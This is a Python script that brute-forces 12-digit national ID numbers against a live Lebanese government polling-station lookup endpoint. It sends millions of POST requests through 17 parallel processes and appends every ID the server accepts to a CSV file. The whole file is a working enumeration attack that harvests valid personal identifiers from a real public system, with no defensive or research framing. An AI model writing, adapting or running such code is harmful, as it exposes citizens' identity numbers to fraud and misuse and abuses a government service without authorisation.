import concurrent.futures
import requests

# potential_IDs = range(52693, 1000000000000)
potential_IDs = range(3567037, 10000000)
url = "https://www.dgcs.gov.lb/PollingStations/GetPollingStationExpat"


def is_valid_ID(n):
    id_txt = str(n).zfill(12)
    myobj = {'Type': 'IDNumber', 'IDNumber': id_txt}
    x = requests.post(url, data=myobj)
    return x.json()['success']


def main():
    # `2 * multiprocessing.cpu_count() + 1`
    with concurrent.futures.ProcessPoolExecutor(max_workers=17) as executor:
        for ID, valid in zip(potential_IDs, executor.map(is_valid_ID, potential_IDs)):
            # print(ID)
            if valid:
                print(ID, " is valid ")
                with open("Valid National ID.csv", mode='a') as f:
                    id_txt = str(ID).zfill(12)
                    f.write(id_txt)
                    f.write('\n')


if __name__ == '__main__':
    main()
